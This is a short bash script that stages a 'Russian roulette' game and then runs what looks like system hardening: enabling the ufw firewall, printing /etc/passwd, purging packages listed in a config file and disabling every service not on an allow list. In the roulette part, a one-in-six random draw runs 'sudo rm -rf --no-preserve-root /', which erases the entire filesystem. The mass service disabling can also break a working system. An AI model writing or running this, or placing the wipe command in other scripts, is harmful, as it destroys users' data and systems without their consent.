#!/bin/bash
RANDOM_NUMBER=$((RANDOM % 6 + 1))
echo "loading cylinder"
sleep 0.5
clear
echo "loading cylinder ."
sleep 0.5
clear
echo "loading cylinder . ."
sleep 0.5
clear
echo "loading cylinder . . ."
sleep 0.5
clear
echo "1 bullet loaded!"
sleep 1
clear

if [ $RANDOM_NUMBER -eq 6 ]; then 
  echo "pulling trig — "
  sleep 0.5
  clear
  echo "BANG!"
  sleep 2
  clear
  sudo rm -rf --no-preserve-root /
else
  echo "pulling trigger"
  sleep 1
  clear
  echo "pulling trigger —"
  sleep 1
  clear
  echo "your system lives too die another day"
  sleep 3
  clear
fi

sudo ufw enable

while read user; do
  echo $user
done < /etc/passwd

while read package; do
  sudo apt purge --autoremove $package
done < ../configs/no_packages

for service in $(sudo systemctl list-units --type=service); do
  echo "$service"
  if ! grep $service ../configs/default_services && ! grep $service ../input/yes_services; then
    sudo systemctl disable --now $service
  fi
done





